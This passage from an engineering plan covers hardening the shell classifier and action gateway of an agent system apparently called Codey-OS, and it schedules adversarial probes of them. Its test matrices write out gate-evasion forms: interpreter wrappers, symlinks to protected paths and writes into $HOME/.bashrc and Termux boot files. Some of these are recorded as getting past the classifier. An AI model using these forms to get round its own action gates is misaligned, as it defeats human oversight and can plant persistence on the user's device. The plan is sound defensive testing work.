| NEW-988 | Open Low: finetune plugin `test.py`/manifest drift; `swap_to_finetuned_model`, `merge_lora_with_llama_cpp`, `create_backup_before_import` plugin-callable | **Verify** they are unclassified in `CAPABILITY_AUTHORITY` (refused fail-closed, NEW-942) | No |
| NEW-992 | Open Low: finetune writers not enveloped | **Verify** reach only via refused `call_capability`; then `DORMANT-fail-closed` | No |
| NEW-993 | Open Low: coalescing/mediation limits accepted by design (ACT has no refusal policy) | **Record** as accepted residual | No |
| NEW-1000-1005 | Open Low: config-file mismatch, dead `state.db_path`, relative-capable app paths, relative audit fallback, path distinctness, dead `usable-daemon` | **Verify** 1002/1003 inside the census (path-source census); rest **defer** | No (1003 touches the audit sink: cheap fix, queue) |

### 3.2 Other open or partial WP2.1-range findings

| Finding(s) | Latest status | Group 15 does | Bucket / blocks? |
| --- | --- | --- | --- |
| NEW-933 | Confirmed live at HEAD (`bash -lc 'git push'` -> ACT, verbatim 2.7) | Re-probe vs the foreign work; **fix named forms** in G15c (HIGH), generic part under F2 | B, High |
| NEW-875 / 877 / 893 / 896 / 897 / 895 / 881-884 / 887 / 889-892 | Mostly resolved; remaining are Git fidelity, helper-configuration tail, one policy question (896 push during sequencer) | Census proves every `run_git` caller sits inside an isolated context; 896 stays an Ish question | F (non-blocking) |
| NEW-846 / 857 / 858 / 859 | Notes mediation done (ACT audit); content trust (persistent prompt injection) and integrity/cache open | Record as accepted residual or Ish call | F / I |
| NEW-855 | Confirmed Low: imports create state. Seen live again (section 0) | Add explicit `BOOKKEEPING` disposition and the "set env before import" verifier rule | F |
| NEW-873 / 876 / 874 | Fixed within bounds | None | closed |
| NEW-844 / 852 / 853 / 854 / 856 / 865 / 866 / 869 / 871 / 872 | Low latent/fidelity; 872 hardlink alias is Suspected and cannot be exercised on this device | Defer; 872 cannot be closed, record that | F |
| NEW-946 / 948 / 949 | Open: graph partial relation write, recording-transaction ownership, duration serialization | Defer (fidelity of persistence, not authority) | F |
| NEW-916 / 917 / 912 / 911 / 910 | 916 fixed for observed failures; 917 manifests never run `validate_manifest_v2`; 912 `execute()`/`_handlers` zero callers; 910 fixed | Census re-verifies 912 zero callers; 917 relates to the DoD intent "manifest `permissions`/`resource_limits` enforced": **verify** enforcement for dispatch (group 4/5) and accept the `_discover` validation gap or fix | F, verify |
| NEW-922 / 923 | Low: two HIGH business methods have no `confirmed` plumbing (permanent refusal for AI agent); coverage test blind to non-bare-Name checks | G15a coverage tool supersedes 923's blind spot; 922 stays queued | F |
| NEW-940 | Confirmed (Track B Core route): second-resolution filename collision can truncate a committed upload | Queue for Ish (data-loss class, not authority) | F, Medium |
| NEW-929 / 930 / 931 / 935 / 936 / 921 / 924 / 927 / 928 | Cross-repo or Track B (Aigentik) | Excluded; 936 is a standing Ish privacy question | X / I |
| NEW-749 / 751 / 753 | CCOS CRM read-token least-privilege and `appointment-prep` fan-out under the always-permissioned CCOS actor; 753 **orphaned**, pending Ish | Needs Ish: put under Track B or WP2.1 | I |
| NEW-969-971, 973, 974, 997 | 969/970 fixed+live; 971 live-verified with limits; 973/974/997 Low residuals | Record; 973 doc fix | F |
| NEW-984 / 985 / 986 / 987 / 989 / 990 / 991 / 996 / 998 | Low/test-hygiene residuals; 991 is a **behavior change** (`/init` refuses under yolo/daemon/non-tty) whose docs are stale; 987 four lora tests fail identically at HEAD and must not count as rollback coverage; 996 real `^C` does not interrupt `input()` here | Docs sweep for 984/991; test-only fix for 987/985 if Ish approves (Low); 996 constrains verifier methods | T / F |
| NEW-957 / 994 / 999 | Process incidents (placeholder PID; `git stash`; rule-12 slip) | History only; do not erase | process |
| NEW-886 / 906 / 908 / 909 / 934 | Full-suite SIGABRT/hang, order-dependent tests | Constrains evidence: only bounded chunks, never "full suite passes" | T |
| NEW-745..849 not tagged WP2.1 | Track B UI/CRM items (745, 747-748, 750-752), a doc correction (746), loader/llama flags (754-760), census findings owned by other WPs (761-790), dev-v2 merges and bench/trajectory items (799-816), install/requirements/doc drift (824-833), telemetry/estimator items | Excluded: different WP or track; membership in the WP2.1 range is by tag and latest update, not by ID number (a one-line reason per ID belongs in the G15a report, not here) | X |

Group 13/14 slice status that group 15 must carry forward honestly (not
re-scoped here): 14a, 14a-ext, 14f, 14g, 14i are **not individually
live-verified** (only 14b, 14c, 14d, 14e and NEW-971/959/969/970 have live
runs, each with stated fakes). Group 15 does not need to live-verify all of them;
it needs to say so in the closure ledger and let Ish decide whether the tier is
acceptable for non-process-lifecycle slices.

## 4. Adversarial verification plan

**Independence.** Every verifier is a **new agent that did not write or review
the code under test** (the implementers and reviewers of groups 1-14 are
excluded for the slices they touched). Three hunters, each reading the census
register and the ledger first, each writing a TSV and a raw log to disk after
every probe (so a 429 or usage stop loses nothing), each using only the
disposable environment (three env vars set before any import, proxies unset,
`python3 -I`, fixtures that forbid `os.kill`/`Popen`/network by monkeypatch
before any call, no model, no live store, no real `/dev/tty` ownership claims):

1. **Hunter A, exec/shell/interpreter escape.** Targets the shell tool and
   daemon allowlist. Negative tests, each with an expected class/outcome and
   `classify_shell_command` plus `gate_exec` audit-row assertions on a
   *recording* fake runner (never spawn the dangerous command): every ACT row of
   section 2.7; `bash -lc` / `bash  -c` / `sh -ec` / `env -S` / `xargs` /
   `busybox sh -c` / `timeout 5 pkill` / `nohup pkill`; `ln -s` to a protected
   path followed by `write_file` through the link; `python3 script.py` after a
   `write_file` of the script; `pytest -p`; prefix-boundary admits in
   `_daemon_shell` (`lsof`, `envsubst`, `catman`, `echo2`); `$(...)`/`;` literal
   handling confirmed by reading the argv the fake runner receives; env override
   through `env X=1 cmd`; `python3 main.py --yolo` and `codeyOS --yolo
   --allow-self-mod` self-launch classification; `cp`/`mv`/`tee`/`sed -i` with
   **absolute** paths into `$HOME/.bashrc` and `$HOME/.termux/boot/`, and the
   same through `bash -lc '... >> ~/.bashrc'` (tilde/redirection only matter
   with an interpreter; confirm by reading the argv the fake runner receives).
2. **Hunter B, filesystem / self-modification / import-time.** `Filesystem`
   containment: symlink to outside root, symlink at the final component, `..`
   after symlink resolution, relative paths resolved against the process cwd
   (NEW-986 fail-open `except` in `tools/file_tools.py:117`), `/cwd` change
   (`main.py:1382 os.chdir`) vs the `WORKSPACE_ROOT` snapshot (NEW-899 class),
   case/Unicode variants, `.git/hooks`, `.codeyignore`, new files under the six
   classification roots including a directory literally named `x.py`, files
   in `main.py`/launchers/`lib/`/`install.sh` (NEW-975 item 3), `--allow-self-mod`
   plus `--yolo` write to plugin/bench trees (accepted residual: just measure
   it), bench evaluator tamper detection (`bench/lock.py`/`suite.lock`
   against a shell-ACT edit; do **not** enable `CODEY_TRAJECTORY` and do not run
   the bench, NEW-761), import-time state creation: import every `core.*`/
   `tools.*`/`ccos.*` module under a scratch `CODEY_STATE_DIR` and list what it
   created or wrote; repeat with `CODEY_STATE_DIR` unset only in a container-like
   fake HOME (never the real HOME) to see where it would land.
3. **Hunter C, egress / credential / lifecycle / authority differences.**
   Daemon vs REPL vs one-shot vs `--fix`/`--tdd` vs `--yolo` vs bench authority
   matrix: for each of the production `gate_*` call sites list the
   `confirm_available` predicate it computes and attempt to flip it through
   flags and env (`ALLOW_SELF_MOD`, `--allow-self-mod`, `--lora-force-adopt`,
   `CODEY_SELF_IMPROVE`, `CODEY_LINTER`, `CODEY_LLAMA_SERVER`,
   `CODEY_ACTION_GATEWAY_AUDIT=/dev/null` in a child, relative
   `CODEY_STATE_DIR` for the audit sink, NEW-1003); credential flows
   (`utils/config.py:687`, `core/backup_*.py`, `core/setup_dr_key.py`,
   `tools/provision_ai_agent_auth.py` default DB target); config-selected remote
   backends (what leaves the device when `CODEY_BACKEND`/`CODEY_BACKEND_P`
   select remote, with a recording fake endpoint, no real network);
   notification/outbound HTTP callers (group 8); `kill` rows vs their identity
   validators with synthetic fixtures that forbid signaling; embed foreign-kill
   (NEW-983) refusal cases (unreadable `/proc/net/tcp`, argv lookalike, recycled
   PID simulated).

**Method rules for all hunters.** Read the artifact, dump full key sets before
filtering (CLAUDE.md rule 12). Every probe is recorded with its exact input,
its verbatim output and the code revision. A bypass attempt that fails is also
recorded (negative result with the control that shows the probe could have
succeeded, e.g. the raw unmediated call succeeding in the fixture). No claim of
"no bypass exists"; only "these N probes were tried, these M succeeded".
Findings go to a scratch TSV first; the coordinator allocates IDs and edits the
ledgers (the doc-collision rule). If a probe could cause a real effect (kill,
delete, send), it runs against a recording fake only.

**Evidence tier per claim (CLAUDE.md rule 7):**

| Claim | Minimum tier |
| --- | --- |
| "The census is complete and re-runnable" | Tool code-complete + code-reviewer APPROVED + an independent re-run by a different agent reproducing `scan.tsv` byte-identical at the same `run_meta` hash. Reproduced, not "live". |
| "Row R is GATED/NATIVE_AUTHORITY/BOOKKEEPING" | Disposition row + a named unit test that fails when the mediator is removed (mutation check) + reviewer ack. Live not required unless it is a lifecycle row. |
| "A kill/lifecycle row is safe" | Rule 4 reviewer APPROVED + disposable-process on-device run with real owned children (the 13/14d pattern); synthetic PID fixtures stay "faked". |
| "The classifier closes form X" | Unit test pinning the classification + reviewer; no executing the command. |
| "Shell tool cannot do Y" | Never claimed. Only "classified HIGH_IMPACT and refused/confirmed in these modes", plus the documented opaque-interpreter ceiling. |
| "Real device behavior" (Ctrl-C at `input()`, `/proc/net/tcp`, real pty) | On-device live only; fakes stay labeled "faked" (NEW-996: real `^C` does not interrupt `input()` here). |
| "WP2.1 CLOSED" | Not an agent's call: a ledger entry "closed with accepted residuals" with Ish's explicit sign-off on the residual list, tiered per row (code complete / reviewer-approved / live-verified kept distinct). |

## 5. Ordered slice plan

Every slice runs the full pipeline (architect -> implementer -> code-reviewer ->
live-verifier where stated -> coordinator ledgers/commit). Fan-out agents
default to **Sonnet** (Ish, 2026-10-06). Every agent writes TSV/log files
incrementally. Stage exact paths only; never `git add -A`; no `git stash`
(NEW-994). Check `git status --short` on the three tracking docs immediately
before editing them.

**G15a: census tooling + first census report (no behavior change).**
Sub-steps: (a1) implementer builds `tools/wp21_census.py` and its unit tests
against synthetic fixture trees (alias resolution, ordinal stability, closure
thunks, dynamic SQL, shell scan, git-archive snapshot, dirty-path recording);
reviewer APPROVED. (a2) classification pass: N Sonnet classifier agents split by
directory (core in 3 parts: lifecycle/inference/resource; state/memory/tools;
persistence/CLI/peers; `ccos/`; `restoricon_core/` against `authority.py` and
its coverage test; `pipeline/ telemetry/ tools/ utils/ bench/ codey_estimator/
root`; non-Python: shell, manifests, env names). Each writes its disposition
rows to its own TSV; (a3) a *different* agent re-classifies a >=25 % random
sample, 100 % of `UNMEDIATED`, and 100 % of `GATED` rows resting on a helper
rule; disagreements go to the architect. (a4) coordinator merges into
`docs/wp21_census/dispositions.tsv`, runs the coverage test, allocates
`NEW-1006+`.
Files: `tools/wp21_census.py`, `tests/test_wp21_census_tool.py`,
`tests/test_wp21_census_coverage.py`, `docs/wp21_census/**`. No existing source
edited, so the foreign edits do not interfere (the tool scans a `git archive`).
Tests: tool unit tests; the coverage test; run bounded chunks only. Verification:
reviewer APPROVED + independent re-run reproduces `scan.tsv`; no live run.
Optional a5: `tools/wp21_audit_trace.py` pytest plugin and one bounded trace
run (section 2.8), cross-check against the register.

**G15b: adversarial pass 1, find-only (no fixes).** Three hunters (section 4) on
the HEAD that includes G15a's register. Output: a severity-rated candidate list
(rubric 2.6), each with probe, verbatim output, revision, and a repro that uses
only recording fakes. Purpose: decide which High slices actually exist before
any code changes, and avoid fixing from a stale sizing guess. Coordinator
presents the High list and the Medium/Low queue to Ish for the "fix only High"
cut.

**G15c: shell classifier, named dangerous binaries and combined interpreter
flags (expected High, NEW-933 + kill/publish/persistence forms).** Closes by the
group 6/9 precedent (named binaries to HIGH_IMPACT): `kill killall pkill`, `gh repo create`/`gh` mutating verbs, `crontab`,
`at`, `su` (with the existing `sudo` group), interpreter `-c`/`-e`/combined
short-flag forms (`-lc`, `-ec`, `--`), double-space and tab variants, and
`pip|npm|pkg install|uninstall`. Does **not** attempt generic scripts (F2).
Files (expected): `tools/shell_tools.py`, `tests/test_shell_wrapper_boundaries.py`
or a new `tests/test_shell_named_binary_boundaries.py`, `docs/security.md`.
**Blocked until the foreign diff on `tools/shell_tools.py` and
`tests/test_shell_wrapper_boundaries.py` is resolved by its owner (commit or
discard); re-run the probe matrix on the resulting HEAD first.** Rule 4 does not
strictly apply (classification, not lifecycle) but this is the security
boundary; reviewer mandatory. No real command is ever executed in tests; use the
recording runner. Rule 3 note: classification of `pkill` as HIGH must not be
implemented by calling `pkill`. Verification: reviewer APPROVED +
`classify_shell_command` matrix pinned (section 2.7 inputs as parametrized
cases, with mutation check); live not required.

**G15d.. G15n: other High findings from G15b (unknown count; budget 0-4).**
Expected shapes, each as its own reviewed slice: (i) write classification for
`main.py`, launchers, `lib/*.sh`, `install.sh`, `setup*.sh` if Ish approves F3;
(ii) bench-evaluator write protection if Hunter B shows `bench/lock.py` does not
detect a shell-ACT edit; (iii) embed foreign-kill gateway/audit row (NEW-983,
rule 4 reviewer + disposable-process live run) only if the identity check is
shown bypassable, otherwise audit rows queued; (iv) any credential or egress
path the census finds un-dispositioned. Each slice's file list and tests come
from its finding; none is pre-assigned here.

**G15z: closure re-run.** Re-run the census at the new HEAD (fresh `run_meta`),
require zero `UNKNOWN`, diff vs the G15a register (every new row must have been
dispositioned), run adversarial pass 2 as a *verify-only* run (fresh hunters, or
the same hunters with different seeds) restricted to the fixed High items plus
10 random previously-clean rows, then the coordinator docs closeout: blueprint
WP2.1 entry status note, `PROJECT_LOG.md` entry with verbatim counts, ledger
statuses for every row in section 3 including the explicit "accepted residual"
list for Ish. Docs sweep rolled in: `docs/commands.md:161`,
`docs/architecture.md:163` (NEW-984/991 stale text), `CODEY.md`-related docs.

Ordering note: G15a has no dependency and can start immediately. G15b depends
on G15a's register. G15c depends on Ish's F2 answer for scope breadth and on
resolution of the foreign shell diff. G15z last.

## 6. Definition-of-done checklist for closing WP2.1

Closing WP2.1 requires **all** of the following; items marked (Ish) are not
agent decisions.

1. DoD wording restated (Ish, F1) so that "three-surface split is gone" and
   "no destructive call site bypasses" have a satisfiable meaning, and closure
   form "closed with accepted residuals" is permitted.
2. `tools/wp21_census.py` exists, is reviewer-approved, and an independent
   re-run reproduces the committed `scan.tsv` at the closing HEAD.
3. `docs/wp21_census/dispositions.tsv` has **zero `UNKNOWN`**, every
   `UNMEDIATED` row carries a finding ID + severity + reach, and the coverage
   test passes at HEAD (and fails when a boundary is added without a
   disposition; demonstrate once).
4. Every HIGH `UNMEDIATED` row is fixed (code complete, reviewer-approved, with
   rule 7 tier stated) **or** explicitly accepted by Ish in the closure ledger.
5. Every row in section 3 has a final status line in `NEW_ISSUES.md` that says
   fixed / accepted-residual / deferred-with-owner / excluded, with the tier.
6. Section 3's "Blocks closure = Yes" rows: NEW-939 census complete, NEW-904 +
   NEW-933 decided (F2), NEW-975 residual decided (F3).
7. Adversarial pass 1 and pass 2 reports committed, verbatim, including probes
   that failed to find anything and the initial-failure runs (do not erase).
8. Every lifecycle (kill/PID/lock) row cites its identity-validation helper, and
   any lifecycle code change has rule 4 reviewer approval plus a disposable
   on-device run.
9. Blueprint WP2.1 entry, `PROJECT_LOG.md`, `NEW_ISSUES.md` updated with the
   closure state; tiers (code complete / reviewer-approved / live-verified)
   listed per slice, including the five group-14 slices with no individual live
   run.
10. Evidence limits stated plainly: the shell tool remains an audited ACT
    opaque-execution surface (unless F2 chooses otherwise); sibling repos
    out of scope except as recorded; the full test suite is not runnable on this
    device (NEW-791/906), so verification is by bounded chunks.

**What cannot be closed by code, and the decision each needs from Ish:**

| Item | Why it cannot close | Decision needed |
| --- | --- | --- |
| NEW-904 (+933 generic part) | Opaque interpreters/scripts (`python3 script.py`, `pytest`, `node -e`) run agent-authored code; classification cannot be exhaustive | F2: accept documented ceiling, or flip to deny-by-default (large autonomy cost) |
| NEW-972 | No production caller; semantics (cancel/queue/refuse) are a product call | Record "accepted callable debt" or choose semantics |
| NEW-943 | External GCP console action | Confirm WP2.1 may close with it tracked as ops backlog |
| NEW-944 | Unscoped; would create a new HIGH_IMPACT delete boundary | Scope separately or leave deferred |
| NEW-872 | Hardlink creation unavailable on this device, cannot be reproduced | Accept as Suspected-not-closable |
| NEW-846 content trust | Persistent prompt-injection via notes is a content-trust policy question | Accept or direct |
| NEW-753 / 936 | Cross-repo/privacy ownership (Track A vs B) | Assign track |
| Five group-14 slices with no individual live run (14a, 14a-ext, 14f, 14g, 14i) | Not process lifecycle; live tier was never required for them | Accept reviewer-approved tier or request live runs |

## 7. Genuine product forks for Ish (true forks only)

- **F1. Restate WP2.1's DoD and the closure form.** As written ("three-surface
  split is gone", "no destructive call site bypasses the gateway") it conflicts
  with the Ish-approved separate `restoricon_core` authority mechanism and with
  the shell tool's ACT regime. Proposed wording: "Every effectful boundary in
  Codey-OS is either mediated by an authority mechanism that fails closed and
  audits truthfully (the Action Gateway, CCOS `CAPABILITY_AUTHORITY`, or
  `restoricon_core` `BUSINESS_MUTATION_AUTHORITY`), is a documented bookkeeping/
  operator-bootstrap disposition, or is on the recorded accepted-residual list;
  the register is mechanically re-checkable." Plus: may WP2.1 close as "closed
  with accepted residuals"?
- **F2. Is the shell tool allowed to remain an audited ACT opaque-execution
  surface?** (NEW-904/933.) Options: (a) accept as the documented ceiling and
  only close *named* dangerous binaries/forms (recommended; it is the group 6/9
  precedent, keeps `--yolo` and the daemon useful); (b) invert to deny-by-
  default for anything not on an allowlist (agent can no longer run
  `python3 script.py` or `pytest` unattended); (c) (a) plus confirm-on-first-use
  per interpreter. Recommendation: (a).
- **F3. Extend HIGH_IMPACT write classification to `main.py`, launchers
  (`codey*`, `codeyOS`, `codeydOS`), `lib/*.sh`, `install.sh`, `setup*.sh`.**
  Ish picked the narrower "recommended" root set in fork 1 on 2026-10-17; under
  the proposed rubric these are "write to self" (High). Re-opening is a
  deliberate reversal of the earlier choice, so it is asked, not assumed.
  Recommendation: extend, since these execute on next launch outside the
  originating confirmation (same reasoning as plugins).
- **F4. Ratify the severity rubric (2.6).** A yes/no, not an option set;
  without it "fix only High" has no boundary.

Not forks (decided precedents applied, or implementation detail): named-binary
HIGH classification (group 6/9 precedent), the audit-reason bound NEW-914
(Medium, queued unless Ish upgrades), keeping `tools/wp21_census.py` out of
`bench/`.

## 8. Cost and usage estimate (rough, for pacing; Sonnet fan-out default)

All figures are order-of-magnitude token budgets per agent run, not guarantees.
The weekly limit and a prior verifier dying on a 429 argue for small, resumable
units that write results to disk incrementally.

| Unit | Agents | Approx tokens | Notes |
| --- | --- | --- | --- |
| G15a tool + tests | implementer 1, reviewer 1 | ~0.8M | one reviewer round expected, two possible |
| G15a classification | 6-7 classifiers (by directory) + 1 sampler | ~1.5-2.0M | read-heavy; resumable per directory |
| G15a coordinator merge | coordinator | ~0.2M | |
| G15b adversarial pass 1 | 3 hunters | ~1.2-1.8M | each ~0.4-0.6M, write TSV per probe |
| G15c shell classifier | implementer, reviewer | ~0.8M | only after the foreign diff is resolved |
| Each further High slice | implementer, reviewer (+ live-verifier if lifecycle) | ~0.8M (+0.4M) | 0-4 slices expected, unknown until G15b |
| G15z closure | census rerun, 3 verify hunters, docs | ~1.5M | |

Rough total **5-9M tokens, about 25-40 agent invocations**, spread over maybe 6-10
working sessions. Cheapest safe pacing: do G15a first (no source risk, high value:
it produces the register and shows whether any High exists), then stop and let
Ish decide F1-F4 before spending on G15b onward. Live-verifier runs are sized per
slice, only for lifecycle rows. No model load is needed for any group 15 slice.

## 9. Findings to log (provisional labels; coordinator allocates IDs)

- **G15-F1** (Confirmed, High-candidate): shell classifier leaves kill/pkill/
  killall, `gh repo create`, `crontab`, `at`, `su`, and absolute-path
  `cp`/`mv`/`tee`/`sed -i`/`rm` into `$HOME` startup files at ACT (verbatim,
  2.7; the tilde/redirection forms are literal without an interpreter and are
  not claimed).
- **G15-F2** (Confirmed, High-candidate): NEW-933 still live at HEAD,
  `bash -lc 'git push'` and `bash  -c 'curl x'` classify ACT (verbatim, 2.7).
- **G15-F3** (Suspected, Low): `_daemon_shell` prefix allowlist has no word
  boundary (`core/task_executor.py:49-66,481-`); verify in G15b.
- **G15-F4** (Suspected, High-candidate pending verification): shell-ACT edit of
  `bench/` evaluator files may not be detected by `bench/lock.py`/`suite.lock`.
- **G15-F5** (Confirmed, Medium, process): previous censuses retained no
  scanner/hashes; `bench/`, `telemetry/`, `codey_estimator/`, shell, manifests
  were never scanned. Addressed by G15a.
- **G15-F6** (Confirmed, Low): NEW-855 re-observed (import of `tools.shell_tools`
  created `state.db` and `checkpoints` under the state dir).
- **G15-F7** (Confirmed, Info): AST gate-enclosure heuristic recognizes only
  22/703 rows; mediation needs per-helper evidence, not lexical enclosure.
- **G15-F8** (Confirmed, Low): environment-variable authority/executable
  selectors have never been censused (`CODEY_LLAMA_SERVER`, `CODEY_LLAMA_LIB`,
  `CODEY_LINTER`, `ALLOW_SELF_MOD`, `CODEY_ACTION_GATEWAY_AUDIT`).
- **G15-F9** (Confirmed, coordination): foreign uncommitted edits to
  `tools/shell_tools.py` (+159 lines), `core/process_boundary.py`, and three
  shell/recovery test files overlap G15c; ownership unresolved.
- **G15-F10** (Confirmed, doc): blueprint DoD wording conflicts with the group-7
  native `restoricon_core` authority decision (fork F1).
- **G15-F11** (Confirmed, tooling): `NEW_ISSUES.md` has no machine-readable
  status field; a regex pass cannot reconcile it. Consider a one-line
  `Status:` convention for new entries.

## ID mapping (appended by the coordinator, 2026-10-23; G15a committed as `90646ff`)

Provisional `G15-F#` labels in this spec map to ledger ids in `NEW_ISSUES.md`
(authoritative for status): G15-F1 and G15-F2 -> NEW-1006 (shell classifier,
includes NEW-933); G15-F3 -> NEW-1007; G15-F4 -> NEW-1008; G15-F5 and G15-F7
-> NEW-1009 (census blind spots / UNKNOWN inventory); G15-F6 -> NEW-1011;
G15-F8 -> NEW-1010; G15-F9 -> NEW-1012; G15-F10 -> NEW-1013; G15-F11 ->
NEW-1014. Ids with no spec label: NEW-1015 (database.py:1074 SyntaxWarning),
NEW-1016 (blocking coverage test vs Track B), NEW-1017 (foreign
`.claude/settings.local.json`). Decisions F1-F4 remain pending with Ish.
